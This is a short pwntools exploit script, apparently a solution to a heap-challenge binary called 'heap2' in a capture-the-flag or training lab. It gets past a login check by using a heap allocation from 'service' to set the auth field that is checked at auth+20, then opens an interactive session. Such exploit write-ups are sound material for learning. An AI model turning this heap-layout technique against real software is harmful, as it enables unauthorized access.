from pwn import *

e = ELF("./heap2")
#libc = ELF("")

context.log_level = "debug"
context.terminal =["tmux", "split", "-h"]
context.binary = e.path

is_remote = "--remote" in sys.argv

if is_remote:
  r = remote("", 1234)
else:
  #env = {"LD_PRELOAD": libc.path}
  r = process(e.path)

def debug():
  if not is_remote:
      gdb.attach(r)

debug()

# the login check looks at auth + 20 and we cannot overflow the auth strcpy but the service also mallocs on the heap and we can use that to set the auth bit

r.recvline()
r.sendline('auth a')
r.recvline()
r.sendline('service 1')
r.recvline()
r.sendline('login')

r.interactive()
